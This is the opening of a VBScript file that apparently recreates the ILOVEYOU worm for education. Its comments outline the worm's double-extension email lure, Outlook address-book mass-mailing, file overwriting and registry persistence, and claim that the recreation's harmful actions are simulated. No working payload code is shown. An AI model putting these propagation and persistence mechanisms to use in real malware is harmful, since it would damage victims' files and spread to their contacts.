' HOW THE WORM WORKED (High-Level Overview):
' ==========================================
' 1. ARRIVED AS EMAIL with subject "ILOVEYOU" and attachment "LOVE-LETTER-FOR-YOU.TXT.vbs"
' 2. DOUBLE-CLICK EXECECUTION by victim (thought it was a text file due to .vbs double extension)
' 3. DROPPED COPIES of itself to Windows system directories
' 4. SELF-REPLICATED by scanning Outlook address book and sending itself to all contacts
' 5. OVERWROTE local files (MP3, JPG, and other media files)
' 6. REGISTERED ITSELF in Windows Registry for persistence on startup
'
' TECHNICAL BREAKDOWN:
' ===================
' This recreation shows the core mechanisms with SAFETY MODIFICATIONS:
' - Email sending via Outlook (SIMULATED - no actual emails sent)
' - File system traversal (READ-ONLY - no actual file modifications)
' - Registry manipulation (SIMULATED - no actual registry changes)
' - mIRC chat client infection (DISABLED - for educational demonstration only)

On Error Resume Next

' ============================================================================
